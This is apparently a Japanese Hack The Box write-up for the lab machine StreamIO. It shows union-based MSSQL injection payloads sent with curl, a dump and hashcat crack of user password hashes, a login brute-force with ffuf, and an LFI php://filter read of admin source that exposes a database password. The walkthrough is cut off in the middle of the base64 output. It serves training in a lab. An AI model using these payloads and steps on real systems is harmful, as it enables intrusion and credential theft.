https://app.hackthebox.com/machines/StreamIO

## STEP 1
```sh
└─$ rustscan -a 10.129.62.39 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.62.39:53
Open 10.129.62.39:80
Open 10.129.62.39:88
Open 10.129.62.39:135
Open 10.129.62.39:139
Open 10.129.62.39:389
Open 10.129.62.39:443
Open 10.129.62.39:445
Open 10.129.62.39:464
Open 10.129.62.39:593
Open 10.129.62.39:636
Open 10.129.62.39:3268
Open 10.129.62.39:3269
Open 10.129.62.39:5985
Open 10.129.62.39:9389
Open 10.129.62.39:49667
Open 10.129.62.39:49677
Open 10.129.62.39:49678
Open 10.129.62.39:49705
Open 10.129.62.39:49731
10.129.62.39 -> [53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49705,49731]
```


## STEP 2
443番ポートの証明書からドメイン名を確認
```sh
└─$ openssl s_client -connect 10.129.62.39:443 | openssl x509 -nocert -ext subjectAltName
Connecting to 10.129.62.39
Can't use SSL_get_servername
depth=0 C=EU, CN=streamIO
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=EU, CN=streamIO
verify error:num=10:certificate has expired
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
depth=0 C=EU, CN=streamIO
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
X509v3 Subject Alternative Name: 
    DNS:streamIO.htb, DNS:watch.streamIO.htb
^C
```
hosts編集
```sh
└─$ echo '10.129.62.39 streamio.htb watch.streamio.htb' | sudo tee -a /etc/hosts
10.129.62.39 streamio.htb watch.streamio.htb
```
443番アクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_01.png">  
ログインページを確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_02.png">  
列挙  
すべて403だが、adminのみレスポンスサイズが小さいね
```sh
└─$ ffuf -r  -u https://streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 262ms]
js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 262ms]
images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 266ms]
css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 270ms]
Admin                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 480ms]
Images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 263ms]
fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 384ms]
CSS                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 257ms]
ADMIN                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 259ms]
JS                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 315ms]
Js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 506ms]
Css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 508ms]
IMAGES                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 261ms]
Fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 316ms]
:: Progress: [29999/29999] :: Job [1/1] :: 118 req/sec :: Duration: [0:03:40] :: Errors: 1 ::
```
admin配下にもアクセス拒否されるファイルを確認
```sh
└─$ ffuf -u https://streamio.htb/admin/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 490ms]
.                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 254ms]
Index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 298ms]
master.php              [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 329ms]
:: Progress: [17129/17129] :: Job [1/1] :: 137 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
```


## STEP 3
サブドメインにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_03.png">  
列挙
```sh
└─$ ffuf -u https://watch.streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamio.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 268ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 601ms]
search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 734ms]
.                       [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 337ms]
blocked.php             [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 337ms]
Search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 269ms]
Index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 565ms]
Favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 262ms]
favicon.ICO             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 278ms]
:: Progress: [17129/17129] :: Job [1/1] :: 131 req/sec :: Duration: [0:02:03] :: Errors: 0 ::
```
search.phpにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_04.png">  
フォーム内に入力した文字列に部分一致した結果が返されるwebページであった  
入力した文字列は、httpsリクエストデータ内の「q」パラメータに格納されることを確認  
この際のバックエンドのsqlサーバで動作するsqlは、
```sql
# mssql の場合
select name from table where name like '%入力文字列%' 
```
になると予想  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_05.png">  
みんな大好き[portswigger](https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli)のサイトを使ってsqlインジェクションを考える  
まずはコメントアウトが動作するか確認  
```sql
# oracle, mssql, PostgreSQL が動作する
select name from table where name like '%showman'-- %' 
```
みごとコメントアウトが動作した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_06.png">  
次にunion演算子を使用して悪意あるsqlを結合できるかテスト  
[リンク](https://portswigger.net/web-security/sql-injection/union-attacks)で確認できる通り、２つのsql文の結果は同じ列数かつ同じ列の型でないといけない  
列数を把握するために便利なunionインジェクションの一例として
```sql
' ORDER BY 1--
' ORDER BY 1--
# や
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```
などが使用できるが、こいつらを入力すると別ページにリダイレクトされる仕組みになっていた  
どうやら`order`や`null`文字列がwafみたいなやつにひっかかったぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_07.png">  
他にも下記のsqlで列数を把握できるため試行
```sql
# select 1,2 だと２列のテーブルを表示する
' UNION SELECT 1--
' UNION SELECT 1,2--
```
ちなみにunion対象のテーブルは文字列型のデータっぽいので、インジェクションするデータも文字列型を指定する  
すると６列のテーブルを結合すると結果が確認できた、ちなみにテーブルの２列目がwebページに表示されているイメージ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_08.png">  


## STEP 4
burpsuiteでhttpsリクエストの仕組みが分かっていので、あとはコマンドラインで引き続きsqlインジェクション  
まずはsqlのバージョンを確認していくと、mssqlの構文でバージョン情報を確認できた
```sh
└─$ curl -d "q=testtest' union select '1',@@version,'3','4','5','6'--" -k https://watch.streamio.htb/search.php

~~~
    <div>
        <div class="d-flex movie align-items-end">
            <div class="mr-auto p-2">
                <h5 class="p-2">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
                    Sep 24 2019 13:48:23 
                    Copyright (C) 2019 Microsoft Corporation
                    Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                </h5>
            </div>
        <div class="ms-auto p-2">
                <span class="">3</span>
                <button class="btn btn-dark" onclick="unavailable();">Watch</button>
        </div>
    </div>
~~~
```
mssqlの構文は残念ながら詳しくないので、[swisskyrepo](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/#mssql-enumeration)のチートシートを使っていく  
テーブルをリストすると「movies」と「users」を確認、moviesはフォーラムで入力した文字列の検索先のテーブルでしょう
```sh
└─$ curl -d "q=testtest' union select '1',table_name,'3','4','5','6' from information_schema.tables--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
                <h5 class="p-2">movies</h5>
                <h5 class="p-2">users</h5>
```
usersテーブルの列名を確認
```sh
└─$ curl -d "q=testtest' union select '1',column_name,'3','4','5','6' from information_schema.columns where table_name='users'--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
                <h5 class="p-2">id</h5>
                <h5 class="p-2">is_staff</h5>
                <h5 class="p-2">password</h5>
                <h5 class="p-2">username</h5>
```
クレデンシャルっぽいものを発見
```sh
└─$ curl -d "q=testtest' union select '1',concat(username,password),'3','4','5','6' from users--" -k -s https://watch.streamio.htb/search.php | grep '<h5' > credentials.txt

└─$ cat credentials.txt                                       
                <h5 class="p-2">admin                                             665a50ac9eaa781e4f7f04199db97a11                  </h5>
                <h5 class="p-2">Alexendra                                         1c2b3d8270321140e5153f6637d3ee53                  </h5>
                <h5 class="p-2">Austin                                            0049ac57646627b8d7aeaccf8b6a936f                  </h5>
                <h5 class="p-2">Barbra                                            3961548825e3e21df5646cafe11c6c76                  </h5>
                <h5 class="p-2">Barry                                             54c88b2dbd7b1a84012fabc1a4c73415                  </h5>
                <h5 class="p-2">Baxter                                            22ee218331afd081b0dcd8115284bae3                  </h5>
                <h5 class="p-2">Bruno                                             2a4e2cf22dd8fcb45adcb91be1e22ae8                  </h5>
                <h5 class="p-2">Carmon                                            35394484d89fcfdb3c5e447fe749d213                  </h5>
                <h5 class="p-2">Clara                                             ef8f3d30a856cf166fb8215aca93e9ff                  </h5>
                <h5 class="p-2">Diablo                                            ec33265e5fc8c2f1b0c137bb7b3632b5                  </h5>
                <h5 class="p-2">Garfield                                          8097cedd612cc37c29db152b6e9edbd3                  </h5>
                <h5 class="p-2">Gloria                                            0cfaaaafb559f081df2befbe66686de0                  </h5>
                <h5 class="p-2">James                                             c660060492d9edcaa8332d89c99c9239                  </h5>
                <h5 class="p-2">Juliette                                          6dcd87740abb64edfa36d170f0d5450d                  </h5>
                <h5 class="p-2">Lauren                                            08344b85b329d7efd611b7a7743e8a09                  </h5>
                <h5 class="p-2">Lenord                                            ee0b8a0937abd60c2882eacb2f8dc49f                  </h5>
                <h5 class="p-2">Lucifer                                           7df45a9e3de3863807c026ba48e55fb3                  </h5>
                <h5 class="p-2">Michelle                                          b83439b16f844bd6ffe35c02fe21b3c0                  </h5>
                <h5 class="p-2">Oliver                                            fd78db29173a5cf701bd69027cb9bf6b                  </h5>
                <h5 class="p-2">Robert                                            f03b910e2bd0313a23fdd7575f34a694                  </h5>
                <h5 class="p-2">Robin                                             dc332fb5576e9631c9dae83f194f8e70                  </h5>
                <h5 class="p-2">Sabrina                                           f87d3c0d6c8fd686aacc6627f1f493a5                  </h5>
                <h5 class="p-2">Samantha                                          083ffae904143c4796e464dac33c1f7d                  </h5>
                <h5 class="p-2">Stan                                              384463526d288edcc95fc3701e523bc7                  </h5>
                <h5 class="p-2">Thane                                             3577c47eb1e12c8ba021611e1280753c                  </h5>
                <h5 class="p-2">Theodore                                          925e5408ecb67aea449373d668b7359e                  </h5>
                <h5 class="p-2">Victor                                            bf55e15b119860a6e6b5a164377da719                  </h5>
                <h5 class="p-2">Victoria                                          b22abb47a02b52d5dfa27fb0b534f693                  </h5>
                <h5 class="p-2">William                                           d62be0dc82071bccc1322d64ec5b6c51                  </h5>
                <h5 class="p-2">yoshihide                                         b779ba15cedfd22a023c4d8bcf5f2332                  </h5>
```
パスワードの形式を確認、おそらくmd5っぽい可能性が高い
```sh
└─$ echo '665a50ac9eaa781e4f7f04199db97a11' > test.txt                            

└─$ name-that-hash -f test.txt --no-banner 

665a50ac9eaa781e4f7f04199db97a11

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  Tiger-128,  Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 
md5(md5(md5($pass))), HC: 3500 Summary: Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))), HC: 4300  md5(sha1($pass)), HC: 4400  
md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, 
JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt
```
md5ハッシュのなかでクラックできたパスワードを複数確認
```sh
└─$ cat credentials.txt | awk '{print $3}' > passwords.txt

└─$ hashcat -a 0 -m 0 passwords.txt /usr/share/wordlists/rockyou.txt --quiet > cracked.txt

└─$ cat cracked.txt
3577c47eb1e12c8ba021611e1280753c:highschoolmusical
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
665a50ac9eaa781e4f7f04199db97a11:paddpadd
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
有効なクレデンシャルを再度まとめる
```sh
└─$ cat cracked.txt | awk -F ':' '{print $1}' > cracked_hashes.txt

└─$ grep -Ff cracked_hashes.txt credentials.txt | sed 's/<h5 class="p-2">//g' | awk '{print $1 ":"$2}' > temp.txt

└─$ awk -F: 'NR==FNR{a[$1]=$2;next}{print $1,a[$2]}' OFS=: cracked.txt temp.txt > vaild.txt

└─$ cat vaild.txt 
admin:paddpadd
Barry:$hadoW
Bruno:$monique$1991$
Clara:%$clara
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```
とういうことでstep2で見つけたlogin.phpにブルートフォース攻撃
```sh
└─$ curl -d "username=admin&password=admin" -k -s https://streamio.htb/login.php | grep 'Login failed'
        <div class="alert alert-danger">Login failed</div>

└─$ cat vaild.txt | awk -F ':' {'print $1'} > users.txt

└─$ cat vaild.txt | awk -F ':' {'print $2'} > pass.txt
```
ffufのデフォルトのhttpsリクエストヘッダでは、うまくログインリクエストが処理されていなかったので  
ブラウザ上でのhttpsリクエストをburpsuiteでキャプチャし、ffufで再利用  
ログイン成功するクレデンシャルを発見した
```sh
└─$ cat request                                       
POST /login.php HTTP/1.1
Host: streamio.htb
Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://streamio.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: https://streamio.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=userFUZZ&password=passFUZZ

└─$ ffuf -request request -w users.txt:userFUZZ -w pass.txt:passFUZZ -fr 'Login failed'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://streamio.htb/login.php
 :: Wordlist         : userFUZZ: /home/kali/users.txt
 :: Wordlist         : passFUZZ: /home/kali/pass.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Referer: https://streamio.htb/login.php
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Host: streamio.htb
 :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
 :: Header           : Origin: https://streamio.htb
 :: Header           : Te: trailers
 :: Header           : Connection: keep-alive
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Priority: u=0, i
 :: Data             : username=userFUZZ&password=passFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Login failed
________________________________________________

[Status: 302, Size: 4147, Words: 796, Lines: 111, Duration: 780ms]
    * passFUZZ: 66boysandgirls..
    * userFUZZ: yoshihide

:: Progress: [144/144] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
ログイン成功
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_09.png">


## STEP 5
step2で怪しかったadmin配下のindex.phpにアクセスできた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_10.png">  
また同じ配下にあるmaster.phpにアクセスするとこんな感じ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_11.png">  
curlで認証後のwebページにアクセスするために、step4時にburpsuiteでキャプチャしたcookieを使用  
それぞれのリンクはphpのパラメータに関するものだった
```sh
└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -s https://streamio.htb/admin/index.php | grep 'href'
~~~
                                <a class="nav-link" href="?user=">User management</a>
                                <a class="nav-link" href="?staff=">Staff management</a>
                                <a class="nav-link" href="?movie=">Movie management</a>
                                <a class="nav-link" href="?message=">Leave a message for admin</a>
```
各パラメータにfileインクルードの脆弱性はなさそうだった  
リンクで確認できるパラメータ以外のパラメータの有無を調査したところ、debugを確認
```sh
└─$ ffuf -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -u 'https://streamio.htb/admin/index.php?FUZZ=' -c -fs 1678 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/index.php?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 417ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 267ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 269ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 272ms]
:: Progress: [6453/6453] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```
ということでdebugパラメータにアクセス、変なメッセージ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_12.png">  
debugパラメータにはlfiの脆弱性を確認
```sh
└─$ ffuf -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -u 'https://streamio.htb/admin/index.php?debug=FUZZ' -c -fs 1712 -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/index.php?debug=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1712
________________________________________________

C:/Windows/win.ini      [Status: 200, Size: 1804, Words: 95, Lines: 57, Duration: 483ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 2577, Words: 262, Lines: 71, Duration: 493ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 46280, Words: 8867, Lines: 719, Duration: 751ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 2119, Words: 177, Lines: 66, Duration: 766ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 2577, Words: 262, Lines: 71, Duration: 766ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19347, Words: 8602, Lines: 337, Duration: 768ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 5395, Words: 717, Lines: 129, Duration: 769ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 3070, Words: 534, Lines: 77, Duration: 769ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1988, Words: 119, Lines: 54, Duration: 602ms]
:: Progress: [236/236] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
ためしにindex.phpのソースをlfiしてみたが確認できず  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_13.png">  
しかしphpの機能であるラッパーを使用するとソースコードを確認できた
```sh
└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php' 

~~~

                <div id="inc">
                        this option is for developers onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaX